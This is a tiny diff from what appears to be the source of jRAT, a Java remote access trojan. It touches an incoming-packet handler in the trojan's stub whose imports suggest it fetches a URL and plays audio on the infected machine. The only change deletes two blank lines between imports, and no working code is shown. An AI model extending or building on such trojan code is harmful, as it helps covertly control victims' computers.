@@ -2,9 +2,7 @@ package io.jrat.stub.packets.incoming;
 
 import io.jrat.common.codec.Hex;
 import io.jrat.stub.Connection;
-
 import java.net.URL;
-
 import javax.sound.sampled.AudioInputStream;
 import javax.sound.sampled.AudioSystem;
 import javax.sound.sampled.Clip;
